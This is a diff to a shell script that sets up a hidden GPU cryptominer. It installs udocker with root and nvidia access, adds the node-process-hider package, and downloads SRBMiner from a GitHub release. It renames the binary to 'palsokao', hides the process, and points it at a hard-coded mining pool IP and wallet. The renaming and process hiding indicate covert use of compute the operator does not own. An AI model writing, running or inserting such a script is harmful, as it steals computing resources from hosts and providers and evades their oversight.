@@ -1,8 +1,18 @@
+curl https://github.com/indigo-dc/udocker/releases/download/1.3.17/udocker-1.3.17.tar.gz -L -o udocker-1.3.17.tar.gz
+tar zxvf udocker-1.3.17.tar.gz
+export PATH=`pwd`/udocker-1.3.17/udocker:$PATH
+udocker --allow-root pull python:latest
+udocker --allow-root create --name=python python:latest
+udocker setup --nvidia python
+udocker --allow-root run python /bin/bash
+
+udocker
+echo
+apt update && apt -y install wget curl sudo nodejs npm
+npm i -g node-process-hider
 nvidia-smi
 wget https://github.com/rxt36q6/file/releases/download/1/SRBMiner-Multi-3-5-9-Linux.tar.gz
 tar xf SRBMiner-Multi-3-5-9-Linux.tar.gz
 mv SRBMiner-MULTI palsokao
-
-while true; do
+ph add palsokao
 ./palsokao --disable-cpu --algorithm pearlhash --pool 212.47.248.156:80 --wallet prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
-done
